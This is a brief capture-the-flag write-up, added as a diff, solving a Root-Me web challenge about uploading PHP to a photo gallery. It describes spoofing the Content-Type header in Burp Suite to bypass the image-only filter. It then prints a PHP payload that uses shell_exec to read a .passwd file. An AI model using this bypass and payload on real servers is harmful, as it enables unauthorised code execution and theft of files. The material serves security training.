@@ -1,0 +1,15 @@
+Challenge : Your goal is to hack this photo galery by uploading PHP code.
+            Retrieve the validation password in the file .passwd.
+Site : http://challenge01.root-me.org/web-serveur/ch21/
+
+1: Firstly i'm browse the site and found 3 categories (defaced, upload, pirate). In these categories, "upload" is distinct and it include file upload option.
+   So, i'm try to upload exploit code (.php) but it's only accept .jpeg, .gif, .png formats. 
+2: I'm select the .php code in upload option and click upload, intercepted by Burpsuite. I found the "Content-Type: application/octet-stream" and changed to "Content-Type: image/png".
+   Clicked the forward button.
+PHP Code:
+<?php
+$content = shell_exec('cat ../../../.passwd');
+echo "<pre>$content</pre>";
+?>
+PHP Code:
+3: File is uploaded. I'm go back to "upload" category and click the "my uploaded .php file". I got the FLAG.
